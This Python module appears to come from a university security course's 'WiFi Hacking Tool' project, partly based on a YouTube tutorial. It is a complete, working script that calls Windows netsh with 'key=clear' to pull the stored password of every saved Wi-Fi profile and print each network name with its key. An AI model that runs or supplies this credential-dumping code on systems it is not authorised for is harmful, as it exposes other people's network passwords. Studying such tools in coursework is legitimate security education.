'''
==============================
NSSECU2 - Hacking Tool Project
==============================
Members: Escalona, Fadrigo, Fortiz, Manzano, Sy
Topic: WiFi Hacking Tool

Some part of the code was 
referenced from David Bombal's 
YT Tutorial (https://www.youtube.com/watch?v=SzYKzAHsdMg)

windows.py module
'''

import utils.utils as utils
import subprocess
import re

def run():
    utils.cls()
    utils.titlebar()
    print("You are running Windows")
    print(utils.getOS())
    print("The program will run with limited features.")
    utils.bar()
    extract_wifi()

def extract_wifi():
    netsh = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
    profiles = re.findall("All User Profile     : (.*)\r", netsh)
    wifi_list = []
    if len(profiles) != 0:
        for name in profiles:
            wifi_profile = {}
            profile = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
            if re.search("Security key           : Absent", profile):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                password = re.search("Key Content            : (.*)\r", profile_pass)
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile) 

    for x in range(len(wifi_list)):
        print(wifi_list[x]['ssid'] + " > " + wifi_list[x]['password'])